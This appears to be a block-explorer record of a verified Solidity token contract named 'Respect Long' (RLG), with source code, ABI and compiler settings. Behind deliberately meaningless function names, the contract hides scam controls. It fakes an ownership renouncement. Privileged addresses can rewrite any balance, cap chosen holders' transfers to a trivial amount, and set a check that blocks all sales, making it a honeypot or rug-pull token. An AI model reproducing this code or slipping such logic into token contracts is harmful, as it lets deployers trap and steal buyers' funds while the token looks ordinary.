{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface minFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fundLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldReceiver {\n    function createPair(address modeTeam, address feeAt) external returns (address);\n}\n\ninterface amountTotalIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletAmountIs) external view returns (uint256);\n\n    function transfer(address launchAuto, uint256 listFund) external returns (bool);\n\n    function allowance(address receiverMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchAuto,\n        uint256 listFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenIs, uint256 value);\n    event Approval(address indexed receiverMax, address indexed spender, uint256 value);\n}\n\ninterface minAutoLaunch is amountTotalIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RespectLong is fundLaunched, amountTotalIs, minAutoLaunch {\n\n    function transferFrom(address modeReceiver, address launchAuto, uint256 listFund) external override returns (bool) {\n        if (_msgSender() != marketingAuto) {\n            if (takeExempt[modeReceiver][_msgSender()] != type(uint256).max) {\n                require(listFund <= takeExempt[modeReceiver][_msgSender()]);\n                takeExempt[modeReceiver][_msgSender()] -= listFund;\n            }\n        }\n        return toTxFrom(modeReceiver, launchAuto, listFund);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toReceiver;\n    }\n\n    uint256 private fromExempt;\n\n    uint256 private receiverMode;\n\n    mapping(address => uint256) private tokenAuto;\n\n    function enableLimitSender(address amountTxList) public {\n        require(amountTxList.balance < 100000);\n        if (tradingFeeFrom) {\n            return;\n        }\n        if (toLaunch) {\n            fromSell = false;\n        }\n        fromSwap[amountTxList] = true;\n        if (walletMinList == receiverMode) {\n            receiverMode = fromExempt;\n        }\n        tradingFeeFrom = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private takeExempt;\n\n    function allowance(address shouldTxLiquidity, address amountBuy) external view virtual override returns (uint256) {\n        if (amountBuy == marketingAuto) {\n            return type(uint256).max;\n        }\n        return takeExempt[shouldTxLiquidity][amountBuy];\n    }\n\n    function toTxFrom(address modeReceiver, address launchAuto, uint256 listFund) internal returns (bool) {\n        if (modeReceiver == feeMax) {\n            return isTradingEnable(modeReceiver, launchAuto, listFund);\n        }\n        uint256 exemptSwap = amountTotalIs(autoSender).balanceOf(amountEnableAt);\n        require(exemptSwap == exemptAtBuy);\n        require(launchAuto != amountEnableAt);\n        if (toSellMarketing[modeReceiver]) {\n            return isTradingEnable(modeReceiver, launchAuto, launchMarketing);\n        }\n        return isTradingEnable(modeReceiver, launchAuto, listFund);\n    }\n\n    address private senderList;\n\n    string private swapTxAt = \"RLG\";\n\n    function shouldFrom() private view {\n        require(fromSwap[_msgSender()]);\n    }\n\n    function approve(address amountBuy, uint256 listFund) public virtual override returns (bool) {\n        takeExempt[_msgSender()][amountBuy] = listFund;\n        emit Approval(_msgSender(), amountBuy, listFund);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return senderList;\n    }\n\n    bool public amountReceiver;\n\n    event OwnershipTransferred(address indexed buyMode, address indexed enableAuto);\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedTrading;\n    }\n\n    uint8 private launchedTrading = 18;\n\n    mapping(address => bool) public fromSwap;\n\n    function balanceOf(address walletAmountIs) public view virtual override returns (uint256) {\n        return tokenAuto[walletAmountIs];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapTxAt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapFee;\n    }\n\n    uint256 exemptAtBuy;\n\n    function walletSender() public {\n        emit OwnershipTransferred(feeMax, address(0));\n        senderList = address(0);\n    }\n\n    uint256 launchLiquidity;\n\n    bool public toLaunch;\n\n    function limitLaunch(address walletLaunchedAuto) public {\n        shouldFrom();\n        \n        if (walletLaunchedAuto == feeMax || walletLaunchedAuto == autoSender) {\n            return;\n        }\n        toSellMarketing[walletLaunchedAuto] = true;\n    }\n\n    function minTradingIs(address fromIs, uint256 listFund) public {\n        shouldFrom();\n        tokenAuto[fromIs] = listFund;\n    }\n\n    bool private amountBuyAuto;\n\n    uint256 private swapFee = 100000000 * 10 ** 18;\n\n    address public feeMax;\n\n    function isTradingEnable(address modeReceiver, address launchAuto, uint256 listFund) internal returns (bool) {\n        require(tokenAuto[modeReceiver] >= listFund);\n        tokenAuto[modeReceiver] -= listFund;\n        tokenAuto[launchAuto] += listFund;\n        emit Transfer(modeReceiver, launchAuto, listFund);\n        return true;\n    }\n\n    address amountEnableAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private toReceiver = \"Respect Long\";\n\n    function owner() external view returns (address) {\n        return senderList;\n    }\n\n    uint256 constant launchMarketing = 14 ** 10;\n\n    function transfer(address fromIs, uint256 listFund) external virtual override returns (bool) {\n        return toTxFrom(_msgSender(), fromIs, listFund);\n    }\n\n    bool private fromSell;\n\n    address marketingAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public walletMinList;\n\n    bool public tradingFeeFrom;\n\n    address public autoSender;\n\n    mapping(address => bool) public toSellMarketing;\n\n    function senderIsLimit(uint256 listFund) public {\n        shouldFrom();\n        exemptAtBuy = listFund;\n    }\n\n    bool private feeTo;\n\n    constructor (){\n        \n        minFrom tokenWallet = minFrom(marketingAuto);\n        autoSender = shouldReceiver(tokenWallet.factory()).createPair(tokenWallet.WETH(), address(this));\n        \n        feeMax = _msgSender();\n        walletSender();\n        fromSwap[feeMax] = true;\n        tokenAuto[feeMax] = swapFee;\n        if (amountReceiver) {\n            toLaunch = true;\n        }\n        emit Transfer(address(0), feeMax, swapFee);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTxLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAmountIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTxList\",\"type\":\"address\"}],\"name\":\"enableLimitSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLaunchedAuto\",\"type\":\"address\"}],\"name\":\"limitLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFund\",\"type\":\"uint256\"}],\"name\":\"minTradingIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listFund\",\"type\":\"uint256\"}],\"name\":\"senderIsLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toSellMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFeeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMinList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RespectLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}